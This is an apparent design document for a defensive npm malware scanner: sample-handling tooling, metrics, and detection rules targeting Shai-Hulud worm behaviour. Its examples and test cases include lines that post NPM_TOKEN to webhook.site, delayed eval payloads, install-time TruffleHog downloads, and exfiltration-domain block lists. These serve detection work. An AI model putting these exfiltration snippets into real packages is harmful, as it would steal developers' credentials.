Decision Document: Phase 2 Sample Testing Framework & Tier 1 Detection Rules
Date: 2025-02-07
Status: APPROVED
Scope: Phase 2 architecture for continuous threat sample evaluation + Tier 1 detection capabilities

Executive Summary
Phase 1 delivered a production-ready scanner with solid fundamentals (94% coverage, plugin architecture, multi-format reporting). Phase 2 shifts focus to empirical validation against real-world malware samples from opensourcemalware.com.
This decision document defines:

Sample Testing Framework: Architecture for acquiring, safely handling, and continuously evaluating threat samples
Tier 1 Detection Rules: High-impact, low-false-positive rules targeting active Shai-Hulud campaign patterns
Gap Analysis Workflow: Systematic methodology for identifying and closing detection gaps


1. Sample Testing Framework Architecture
1.1 Design Principles
Automated Threat Intelligence Integration

Pull samples from opensourcemalware.com tagged with relevant campaigns
Track provenance (sample ID, source URL, tags, campaign name, fetch date)
Maintain both malicious corpus and known-good validation set

Safe Handling

Never execute samples - static analysis only
Store samples outside git repository (.gitignore all sample directories)
Neutered versions only in committed test fixtures (tokens removed, domains replaced)
Sandboxed environment for manual analysis (disposable VM/container)

Continuous Validation

Weekly automated runs against full corpus
Regression testing as rules evolve
Track detection rates over time (CSV metrics)
Compare scanner findings to published threat intelligence

Gap-Driven Development

Document every missed sample with manual analysis
Extract patterns for new detection rules
Validate new rules against known-good packages before deployment
Update test suite with malware-derived test cases

1.2 Directory Structure
dev-trust-scanner/
├── samples/                          # NOT in git (.gitignore)
│   ├── malicious/                    # Real malware samples
│   │   ├── shai-hulud/               # Campaign-organized
│   │   │   ├── sample-001/           # Individual packages
│   │   │   └── sample-002/
│   │   ├── contagious-interview/
│   │   └── metadata.json             # Sample provenance tracking
│   └── known-good/                   # Validation set
│       ├── react/                    # Top npm packages
│       ├── lodash/
│       └── metadata.json
├── tools/
│   ├── fetch_samples.py              # Download/import samples
│   ├── validate_samples.py           # Run scanner against corpus
│   ├── gap_analysis.py               # Compare results to known-malicious
│   └── neuter_sample.py              # Sanitize for test fixtures
├── analysis/
│   ├── gap-reports/                  # Per-sample miss analysis
│   │   └── 2025-02-10-sample-sha1-hulud-v2.md
│   ├── validation-reports/           # Weekly test runs
│   │   └── 2025-02-10-validation.json
│   └── metrics/                      # Historical tracking
│       └── detection-rates.csv       # Time-series data
└── tests/
    └── fixtures/
        ├── malicious/                # Neutered samples for unit tests
        │   └── shai-hulud-neutered/  # Tokens removed, safe to commit
        └── known-good/               # Legitimate code patterns
1.3 Component Specifications
tools/fetch_samples.py
Purpose: Acquire samples and manage corpus
Features:

Manual Import Mode (Phase 2.1): Import locally downloaded samples from opensourcemalware.com

import-sample command with campaign/tags/sample-id parameters
Validates sample structure (package.json present, etc.)
Records metadata in metadata.json


Known-Good Fetcher: Download top-N npm packages for validation

Uses npm registry API to fetch popular packages
Default top-100 for false-positive testing
Tracks as separate "validation-set" campaign


Future: OSM API Integration (when available)

Direct fetch with tag filtering
Automated weekly pulls via cron/GitHub Actions



Metadata Schema:
json{
  "samples": [
    {
      "sample_id": "sha1-hulud-variant-2",
      "source": "https://opensourcemalware.com/sample/xyz",
      "tags": ["shai-hulud", "npm-worm"],
      "campaign": "shai-hulud",
      "sha256": "abc123...",
      "fetched_at": "2025-02-07T10:30:00Z",
      "known_malicious": true,
      "references": [
        "https://reversinglabs.com/blog/shai-hulud-analysis"
      ]
    }
  ]
}
CLI Examples:
bash# Import manually downloaded sample
python tools/fetch_samples.py import-sample \
    ~/Downloads/malicious-pkg/ \
    --campaign shai-hulud \
    --tags shai-hulud,npm-worm \
    --sample-id sha1-hulud-v2

# Fetch validation set
python tools/fetch_samples.py fetch-known-good --top-n 100

# Future: Direct fetch
python tools/fetch_samples.py fetch-malicious --tags shai-hulud --limit 20
tools/validate_samples.py
Purpose: Run scanner against corpus and generate validation reports
Features:

Corpus Scanning: Iterate through all samples in samples/malicious/ or samples/known-good/
Result Comparison: Match scanner findings against known-malicious metadata
Detection Metrics:

Total samples scanned
Detected (findings > 0)
Missed (known-malicious with no findings)
False positives (known-good with findings)
Detection rate percentage


Report Formats:

JSON: Machine-readable for CI/metrics tracking
Markdown: Human-readable summary for weekly reviews
CSV: Time-series metrics for trend analysis



Output Schema (validation-reports/YYYY-MM-DD-validation.json):
json{
  "scan_date": "2025-02-10T14:00:00Z",
  "scanner_version": "0.2.0",
  "corpus": {
    "malicious_samples": 47,
    "known_good_samples": 100
  },
  "results": {
    "detected": 38,
    "missed": 9,
    "false_positives": 2,
    "detection_rate": 0.809
  },
  "missed_samples": [
    {
      "sample_id": "shai-hulud-v3",
      "campaign": "shai-hulud",
      "reason": "novel_obfuscation"
    }
  ],
  "false_positives": [
    {
      "sample_id": "crypto-js",
      "findings": ["high_entropy"],
      "severity": "low"
    }
  ]
}
CLI Examples:
bash# Scan all malicious samples
python tools/validate_samples.py --malicious --output analysis/validation-reports/

# Scan validation set for false positives
python tools/validate_samples.py --known-good

# Full corpus scan with metric tracking
python tools/validate_samples.py --all --update-metrics
tools/gap_analysis.py
Purpose: Generate detailed analysis for missed samples
Features:

Interactive Mode: Prompt analyst to review missed samples
Template Generation: Create gap-report markdown with pre-filled metadata
Pattern Extraction: Suggest potential detection rules based on manual findings
IOC Extraction: Pull domains, file patterns, code signatures from sample

Gap Report Template (analysis/gap-reports/YYYY-MM-DD-sample-{id}.md):
markdown# Gap Analysis: {sample_id}

**Date**: 2025-02-10  
**Campaign**: shai-hulud  
**Sample Source**: https://opensourcemalware.com/sample/xyz  
**Published Intel**: [ReversingLabs report](https://...)

## Scanner Result
- **Findings**: None
- **Expected Detection**: High (known-malicious sample)

## Manual Analysis

### Obfuscation Techniques
- Double base64 encoding: `btoa(btoa(payload))`
- Hex escape sequences in variable names
- Dynamic property access: `process['en'+'v']`

### Execution Flow
1. Install hook: `preinstall` script
2. Delayed execution: `setTimeout(() => eval(...), 5000)`
3. Network exfiltration: `axios.post('https://webhook.site/xxx', secrets)`

### Key Indicators
- **Domains**: webhook.site, pastebin.com
- **Files**: bun_installer.js, 3nvir0nm3nt.json
- **Markers**: "Goldox-T3chs" in comments

## Detection Gaps

### Primary Gap
Current rules don't detect delayed execution patterns (`setTimeout` + `eval`)

### Secondary Gaps
- Missing axios + process.env correlation
- No webhook.site domain check
- Doesn't flag campaign markers in comments

## Proposed Rules

### Rule 1: Delayed Execution + Eval
```yaml
id: NPM-LC-005
pattern: setTimeout.*eval|setInterval.*eval
severity: high
confidence: high
```

### Rule 2: Exfiltration Domain List
```yaml
id: NPM-NET-003
domains:
  - webhook.site
  - requestbin.com
context: network_call + env_access
```

## Validation Plan
- [ ] Test Rule 1 against top-100 npm (check for false positives)
- [ ] Add neutered sample to test fixtures
- [ ] Re-run against this sample (verify detection)
- [ ] Update metrics
CLI Examples:
bash# Generate gap report for specific sample
python tools/gap_analysis.py --sample-id sha1-hulud-v3 --interactive

# Batch mode for all missed samples from last validation
python tools/gap_analysis.py --from-validation analysis/validation-reports/2025-02-10-validation.json
tools/neuter_sample.py
Purpose: Sanitize malicious samples for safe test fixture commits
Features:

Token Removal: Strip actual tokens, API keys, secrets
Domain Replacement: Replace exfiltration domains with example.com
Comment Injection: Add WARNING headers to files
Structure Preservation: Keep obfuscation/patterns intact for detection testing

Safety Transformations:
javascript// BEFORE (malicious)
const token = process.env.NPM_TOKEN;
axios.post('https://webhook.site/xyz', { token });

// AFTER (neutered)
// WARNING: This is a neutered malware sample for testing purposes only
// Original sample: shai-hulud-v2 from opensourcemalware.com
const token = process.env.NPM_TOKEN;
axios.post('https://example.com/neutered', { token: 'REDACTED' });
CLI Examples:
bash# Neuter sample for test fixtures
python tools/neuter_sample.py \
    samples/malicious/shai-hulud/sample-001/ \
    tests/fixtures/malicious/shai-hulud-neutered/ \
    --remove-tokens --replace-domains
1.4 Metrics Tracking
Time-Series CSV (analysis/metrics/detection-rates.csv):
csvdate,total_samples,detected,missed,detection_rate,false_positives,scanner_version
2025-02-10,47,38,9,0.809,2,0.2.0
2025-02-17,52,44,8,0.846,1,0.2.1
Visualization: Weekly chart showing detection rate trend over time
1.5 Weekly Workflow
Monday: Sample Acquisition
bash# Download new samples from opensourcemalware.com (manual for now)
# Import into corpus
python tools/fetch_samples.py import-sample ...
Tuesday-Thursday: Gap Analysis & Rule Development
bash# Run validation scan
python tools/validate_samples.py --all --output analysis/validation-reports/

# Analyze missed samples
python tools/gap_analysis.py --from-validation analysis/validation-reports/latest.json

# Develop new rules (manual work in rules/*.yml)

# Test new rules
pytest tests/ -v
Friday: Validation & Commit
bash# Re-run full validation
python tools/validate_samples.py --all --update-metrics

# Check false positive rate
python tools/validate_samples.py --known-good

# Commit if metrics improve
git add rules/ tests/ analysis/metrics/
git commit -m "Add NPM-LC-005: delayed execution detection (detection rate: 81% → 85%)"

2. Tier 1 Detection Rules
2.1 Rule Metadata Schema
Standardize all rules with metadata for campaign tracking and confidence scoring:
yaml# rules/npm-lifecycle/trufflehog-download.yml
metadata:
  id: NPM-LC-001
  created: 2025-02-07
  updated: 2025-02-07
  campaign: shai-hulud
  confidence: high  # high|medium|low
  severity: critical  # critical|high|medium|low
  false_positive_rate: 0.0  # Measured against top-1000 npm
  references:
    - https://opensourcemalware.com/sample/xyz
    - https://reversinglabs.com/blog/shai-hulud
  mitre_attack:
    - T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
    - T1552.001  # Credentials from Files

detection:
  patterns:
    - trufflesecurity/trufflehog
    - download.*trufflehog
  context:
    - install_script  # Must be in package.json scripts
  severity_modifiers:
    - high: contains "releases/download"
    - critical: contains "releases/download" AND env_access

description: |
  Detects downloads of TruffleHog secret scanner binary during package installation.
  This is a signature behavior of Shai-Hulud npm worm variants that scan for secrets
  to facilitate propagation via stolen npm tokens.
2.2 Tier 1 Rules (Week 1-2 Priority)
NPM-LC-001: TruffleHog Binary Download
Target: Shai-Hulud propagation mechanism
Confidence: High (legitimate packages don't download secret scanners)
Expected False Positive Rate: <0.01%
Detection Logic:
yamlpatterns:
  - regex: trufflesecurity/trufflehog.*/releases
  - regex: download.*trufflehog(\.exe)?
context:
  location: [preinstall, postinstall, install]
  file_write: [trufflehog, trufflehog.exe]
Test Cases:

✅ Detect: curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog
✅ Detect: wget trufflesecurity/trufflehog/releases/latest
❌ Ignore: Legitimate dependency on @trufflesecurity/trufflehog npm package (different pattern)


NPM-LC-002: GitHub Actions Workflow Injection
Target: Shai-Hulud persistence/propagation
Confidence: High
Expected False Positive Rate: <0.01%
Detection Logic:
yamlpatterns:
  - file_creation: .github/workflows/*.yml
  - regex: shai-hulud-workflow|goldox.*workflow
context:
  location: [preinstall, postinstall, install]
  file_operations: write
Test Cases:

✅ Detect: Install script creates .github/workflows/shai-hulud-workflow.yml
✅ Detect: Workflow file contains suspicious uses: from forked repos
❌ Ignore: Package includes legitimate .github/workflows/ in distributed files (not created by install script)


NPM-LC-003: Campaign Marker Strings
Target: Shai-Hulud variants identification
Confidence: High
Expected False Positive Rate: 0% (strings are unique to malware)
Detection Logic:
yamlpatterns:
  - regex: shai-hulud|sha1-hulud.*second coming
  - regex: goldox-t3chs.*only happy girl
  - regex: _sha1_hulud_|_goldox_
context:
  location: [comments, strings, variable_names]
Test Cases:

✅ Detect: // Shai-Hulud: The Second Coming
✅ Detect: const marker = "Goldox-T3chs: Only Happy Girl"
✅ Detect: Repository description contains these strings
❌ No false positives expected (these are malware-specific markers)


NPM-LC-004: Webhook Exfiltration Pattern
Target: Data exfiltration to webhook.site, requestbin
Confidence: Medium (some legitimate testing uses these)
Expected False Positive Rate: <0.1%
Detection Logic:
yamlpatterns:
  - regex: webhook\.site|requestbin\.com|pipedream\.net
context:
  network_call: [POST, GET]
  env_access: true  # Must also access environment variables
  location: [preinstall, postinstall, install]
severity_modifiers:
  - medium: webhook domain only
  - high: webhook + env_access
  - critical: webhook + env_access + obfuscation
Test Cases:

✅ Detect: axios.post('https://webhook.site/xyz', { token: process.env.NPM_TOKEN })
✅ Detect: fetch('https://requestbin.com/abc').then(...)
⚠️ Low-severity: Test file uses webhook.site (context: tests/, not install script)
❌ Ignore: Documentation mentions webhook.site as example


NPM-LC-005: Delayed Execution + Eval
Target: Evasion technique observed in Shai-Hulud v3
Confidence: Medium (some legitimate uses exist)
Expected False Positive Rate: <1%
Detection Logic:
yamlpatterns:
  - regex: setTimeout\s*\(.*eval
  - regex: setInterval\s*\(.*eval
  - regex: setTimeout\s*\(.*Function\s*\(
context:
  location: [preinstall, postinstall, install]
severity_modifiers:
  - low: in development dependencies
  - medium: in install scripts
  - high: with obfuscation (base64/hex)
Test Cases:

✅ Detect: setTimeout(() => eval(atob('...')), 5000)
✅ Detect: setInterval(function() { new Function(payload)() }, 1000)
❌ Ignore: Browser polyfill in src/ directory
⚠️ Low-severity: setTimeout + eval in test files


NPM-LC-006: Multi-File Payload Correlation
Target: Obfuscation via file splitting
Confidence: Medium
Expected False Positive Rate: <0.5%
Detection Logic:
yamldetection_type: correlation  # New type - requires plugin enhancement
patterns:
  - file_pairs:
      - [bun_installer.js, environment_source.js]
      - [*_installer.js, *nvir0nm3nt.json]
  - shared_obfuscation_key: true
context:
  both_files:
    - base64_strings: true
    - network_calls: true
Implementation Note: Requires new plugin capability to track patterns across multiple files in same package.
Test Cases:

✅ Detect: Package has bun_installer.js + 3nvir0nm3nt.json with matching base64 keys
✅ Detect: Both files use same unusual variable naming pattern
❌ Ignore: Legitimate multi-file packages with different purposes


2.3 Rule Validation Requirements
Before Deploying Any New Rule:

Unit Tests: Add test case to tests/test_rules.py

python   def test_npm_lc_001_trufflehog_download():
       malicious_code = """
       curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog -o trufflehog
       """
       findings = scan_code(malicious_code)
       assert any(f.rule_id == "NPM-LC-001" for f in findings)

Malware Sample Validation: Test against actual Shai-Hulud samples

bash   python tools/validate_samples.py --sample samples/malicious/shai-hulud/sample-001/
   # Should detect with new rule

False Positive Check: Run against top-100 npm packages

bash   python tools/validate_samples.py --known-good --rule NPM-LC-001
   # Should report FP rate < 1%

Neutered Test Fixture: Add sanitized sample to test suite

bash   python tools/neuter_sample.py \
       samples/malicious/shai-hulud/sample-001/ \
       tests/fixtures/malicious/npm-lc-001-trufflehog/

Documentation: Update rule in rules/ with metadata and references


3. Implementation Roadmap
Week 1: Foundation

 Implement tools/fetch_samples.py with manual import + known-good fetcher
 Implement tools/validate_samples.py with JSON/MD/CSV reporting
 Create directory structure (samples/, analysis/, .gitignore)
 Fetch top-100 npm packages for validation baseline
 Manually import 5-10 Shai-Hulud samples from opensourcemalware.com

Week 2: Tier 1 Rules

 Implement NPM-LC-001 (TruffleHog download)
 Implement NPM-LC-002 (GitHub Actions injection)
 Implement NPM-LC-003 (Campaign markers)
 Add rule metadata schema to all rules
 Run first full validation scan, generate baseline metrics

Week 3: Gap Analysis

 Implement tools/gap_analysis.py with interactive mode
 Analyze missed samples from Week 2 validation
 Implement NPM-LC-004 (Webhook exfiltration)
 Implement NPM-LC-005 (Delayed execution)
 Document first gap report

Week 4: Validation & Refinement

 Implement tools/neuter_sample.py
 Add neutered samples to test fixtures
 Test NPM-LC-006 (Multi-file correlation) feasibility
 Run weekly validation, update metrics
 Publish Phase 2 progress in README


4. Success Criteria
Quantitative:

✅ Detection rate >80% on Shai-Hulud tagged samples
✅ False positive rate <1% on top-100 npm packages
✅ 6 Tier 1 rules deployed with metadata
✅ Weekly validation reports generated
✅ Time-series metrics tracking operational

Qualitative:

✅ Can reproduce detection claims (sample ID → findings)
✅ Gap analysis workflow documented and practiced
✅ Safe handling protocols followed (no sample execution)
✅ Rules cover active campaign TTPs (not just historical IOCs)


5. Technical Decisions
5.1 Sample Storage
Decision: Store samples outside git repository
Rationale:

Avoid accidental distribution of malware
Keep repo size manageable
Allow analysts to maintain private sample collections

Implementation: .gitignore entire samples/ directory, commit only neutered fixtures
5.2 Metadata Format
Decision: JSON for machine-readable, Markdown for human-readable
Rationale:

JSON for CI/automation (validate_samples.py output)
Markdown for analyst review (gap reports, weekly summaries)
CSV for time-series metrics (easy charting in spreadsheets)

5.3 Rule Confidence Scoring
Decision: Three-tier confidence (high/medium/low)
Rationale:

High: <0.1% FP rate, malware-specific patterns (campaign markers, TruffleHog downloads)
Medium: <1% FP rate, legitimate uses exist but rare (webhook exfil + env access)
Low: >1% FP rate, common patterns needing context (delayed execution)

Usage: Users can filter alerts by confidence threshold
5.4 OpenSourceMalware.com Integration
Decision: Start with manual import, automate when API available
Rationale:

opensourcemalware.com API/download mechanism unclear from project instructions
Manual workflow unblocks Phase 2 immediately
Build abstraction layer (SampleFetcher class) for future API integration
Weekly manual pulls sustainable for initial corpus building


6. Open Questions for Implementation

OpenSourceMalware.com Access:

Do they have an API, or is it web UI only?
Authentication required?
Rate limits?
Action: Research and document in implementation


Multi-File Correlation:

Does current plugin architecture support cross-file analysis?
Need new plugin type or enhance existing?
Action: Spike NPM-LC-006 feasibility in Week 3


Metrics Visualization:

Generate charts from CSV automatically?
GitHub Actions integration for weekly reports?
Action: Defer to Month 2 unless trivial




7. Handoff to Claude Code
File Modifications Required

New files:

tools/fetch_samples.py
tools/validate_samples.py
tools/gap_analysis.py
tools/neuter_sample.py
analysis/gap-reports/.gitkeep
analysis/validation-reports/.gitkeep
analysis/metrics/detection-rates.csv
samples/.gitignore


Rule updates (add metadata to existing + create new):

rules/npm-lifecycle/trufflehog-download.yml (NEW - NPM-LC-001)
rules/npm-lifecycle/github-actions-injection.yml (NEW - NPM-LC-002)
rules/npm-lifecycle/campaign-markers.yml (NEW - NPM-LC-003)
rules/npm-lifecycle/webhook-exfiltration.yml (NEW - NPM-LC-004)
rules/npm-lifecycle/delayed-execution.yml (NEW - NPM-LC-005)


Test additions:

tests/test_tier1_rules.py (NEW - Tier 1 rule validation)
tests/fixtures/malicious/ (neutered samples)


Documentation:

Update README.md with Phase 2 objectives
Add docs/SAMPLE_TESTING.md (workflow guide)



Implementation Priority Order

Immediate (Week 1): fetch_samples.py, validate_samples.py, directory structure
High (Week 2): NPM-LC-001, NPM-LC-002, NPM-LC-003 rules
Medium (Week 3): gap_analysis.py, NPM-LC-004, NPM-LC-005
Lower (Week 4): neuter_sample.py, NPM-LC-006 spike

Coding Standards for Claude Code
Type hints everywhere. No Any types unless absolutely unavoidable.
Docstrings on all public functions. Google style.
No classes where functions suffice. Only use classes for plugins and data models.
f-strings for formatting. No .format() or % formatting.
Path objects, not strings. Use pathlib.Path throughout.
Plugin LOC limit: Each plugin scanner.py should be 200-300 lines max. If it's getting longer, refactor shared logic into static_analysis.py.
Rule IDs are namespaced: NPM-XXX for npm, VSC-XXX for vscode, GH-XXX for future git hooks.
No print statements. Use logging module or rich.console for output.
Imports: stdlib first, then third-party, then local. Sorted alphabetically within groups.